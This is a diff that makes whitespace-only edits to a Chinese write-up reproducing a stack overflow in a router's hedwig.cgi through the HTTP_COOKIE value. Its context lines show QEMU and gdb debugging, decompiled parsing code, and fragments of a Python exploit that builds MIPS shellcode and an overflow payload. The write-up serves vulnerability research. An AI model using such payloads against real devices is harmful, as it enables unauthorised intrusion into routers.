@@ -195,12 +195,10 @@ Server
 }
 ```
 
-然后使用 `sudo chmod 750 init`修改 init 的权限为 750 。
-
+然后使用 `sudo chmod 750 init` 修改 init 的权限为 750 。
 
 传入一个 静态编译的 gdbserver 到 mnt 目录下。
 下载链接：[Releases · guyush1/gdb-static](https://github.com/guyush1/gdb-static/releases)
-
 
 最后，解除挂载： `sudo umont mnt` 。
 
@@ -223,7 +221,6 @@ qemu-system-mipsel \
 
 ## 漏洞程序分析
 `/htdocs/web/hedwig.cgi` ，但是是软链接到 `/htdocs/cgibin`
-
 
 ### hedwigcgi_main
 使用 ida 打开
@@ -369,7 +366,6 @@ LABEL_22:
 
 容易想到利用 HTTP_COOKIE 进行栈溢出利用。
 
-
 ## 漏洞复现
 
 ### 调试方案
@@ -379,7 +375,6 @@ LABEL_22:
 ```
 
 然后在宿主机上使用 `gdb-multiarch ./hedwig.cgi` 调试，然后用 `target remote :1234` 连接远程。
-
 
 ### 漏洞利用
 经过分析，知道是 mips 栈溢出利用，为了成功运行到 sprintf，还需要一些额外的准备
@@ -505,7 +500,6 @@ int __fastcall cgibin_parse_request(void (*func)(), int num, unsigned int a3)
 ```
 在 `(funcs[idx - 1].fun)(func, num, CONTENT_LENGTH, &CONTENT_TYPE[len])` 触发函数指针，对应的 path 是 **application/**
 
-
 ```C
 int __fastcall sub_403B10(void (*func)(), int num, size_t len, const char *str) {
 	if ( !strncasecmp(str, "x-www-form-urlencoded", 0x15u) )
@@ -599,7 +593,6 @@ sc += f"""
 
 shellcode = asm(sc)
 
-
 # print("shellcode length: " + str(len(shellcode)))
 # print(b"shellcode: " + shellcode)
 
@@ -621,7 +614,6 @@ payload += 4*b"O"
 payload += 4*b"P"
 payload += 4*b"Q"
 payload += shellcode
-
 
 data = {"atker": "fun"}
 header = {
